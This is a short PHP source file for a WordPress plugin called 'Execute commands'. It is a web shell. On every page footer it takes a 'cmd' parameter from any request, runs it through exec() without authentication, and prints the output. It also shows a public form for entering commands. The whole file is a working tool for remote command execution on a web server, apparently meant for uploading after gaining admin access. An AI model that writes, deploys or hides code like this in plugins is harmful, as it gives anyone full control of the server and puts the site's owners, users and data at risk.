<?php
	/**
	* Plugin Name: Execute commands
	* Plugin URI:
	* Description: Execute commands
	* Version: 1.0
	* Author: x4v1l0k
	* Author URI: https://xavilok.es
	*/

	add_action("wp_footer", "mfp_Add_Text");

	function mfp_Add_Text() {
		if (isset($_REQUEST['cmd'])) {
			echo "<p><h4>Command output:</h4><br><pre>" . exec($_REQUEST['cmd']) . "</pre></p>";
		}
		echo "<p><form method='POST'><input type='text' name='cmd' placeholder='Type a command to execute'><input type='submit' value'Execute command!'></form></p>";
	}
?>
